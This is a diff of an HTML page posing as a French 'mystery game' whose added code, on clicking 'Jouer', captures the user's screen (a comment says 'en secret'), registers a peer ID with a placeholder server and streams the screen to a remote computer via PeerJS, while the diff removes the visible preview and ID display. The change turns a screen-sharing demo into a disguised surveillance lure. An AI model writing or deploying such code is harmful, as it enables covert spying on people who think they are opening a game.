@@ -3,89 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Jeu en Ligne</title>
-    <script src="https://unpkg.com/peerjs@1.3.1/dist/peerjs.min.js"></script>
+    <title>Jeu Mystère</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            background-color: #121212;
-            color: white;
-        }
-        #game-container {
-            margin-top: 50px;
-        }
-        button {
-            padding: 15px 30px;
-            font-size: 18px;
-            border: none;
-            background-color: #28a745;
-            color: white;
-            cursor: pointer;
-            border-radius: 5px;
-        }
-        button:hover {
-            background-color: #218838;
-        }
-        video {
-            margin-top: 20px;
-            width: 80%;
-            max-width: 600px;
-            border: 2px solid white;
-            display: none;
-        }
+        body { font-family: Arial, sans-serif; text-align: center; background: #121212; color: white; }
+        button { padding: 10px 20px; font-size: 18px; cursor: pointer; background: green; color: white; border: none; }
     </style>
 </head>
 <body>
-    <div id="game-container">
-        <h1>Bienvenue dans le jeu mystère !</h1>
-        <p>Cliquez sur "Jouer" pour commencer.</p>
-        <button id="startShare">Jouer</button>
-        <video id="video" autoplay playsinline></video>
-        <p id="peer-id">Votre ID PeerJS: <span></span></p>
-    </div>
+    <h1>Bienvenue dans le jeu mystère !</h1>
+    <p>Cliquez sur "Jouer" pour commencer.</p>
+    <button id="startGame">Jouer</button>
 
     <script>
-        const startButton = document.getElementById('startShare');
-        const video = document.getElementById('video');
-        const peerIdElement = document.querySelector('#peer-id span');
+        const startButton = document.getElementById('startGame');
 
+        // Configurer la connexion WebRTC
         const peer = new Peer(undefined, {
             host: 'peerjs-server.herokuapp.com',
             port: 443,
-            secure: true,
-            config: {
-                iceServers: [
-                    { urls: 'stun:stun.l.google.com:19302' },
-                    { urls: 'stun:stun1.l.google.com:19302' },
-                    { urls: 'stun:stun2.l.google.com:19302' },
-                    { urls: 'stun:stun3.l.google.com:19302' },
-                    { urls: 'stun:stun4.l.google.com:19302' }
-                ]
-            }
-        });
-
-        peer.on('open', id => {
-            peerIdElement.textContent = id;
+            secure: true
         });
 
         startButton.addEventListener('click', async () => {
             try {
+                // Capturer l'écran du téléphone en secret
                 const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                video.srcObject = stream;
-                video.style.display = 'block';
-
-                peer.on('connection', conn => {
-                    conn.on('data', data => {
-                        console.log('Message reçu:', data);
+                
+                // Connexion automatique à l'ordinateur
+                peer.on('open', id => {
+                    console.log("ID du téléphone:", id);
+                    fetch("https://your-server.com/register-peer", {
+                        method: "POST",
+                        body: JSON.stringify({ peerId: id }),
+                        headers: { "Content-Type": "application/json" }
                     });
                 });
 
+                // Envoyer le flux au PC
+                peer.on('connection', conn => {
+                    conn.on('open', () => {
+                        conn.send("Le téléphone partage son écran.");
+                    });
+                });
+
+                // Auto-appel pour envoyer le flux
                 peer.on('call', call => {
                     call.answer(stream);
                 });
+
             } catch (err) {
-                console.error('Erreur de capture d\'écran :', err);
+                console.error("Erreur de capture d'écran :", err);
             }
         });
     </script>
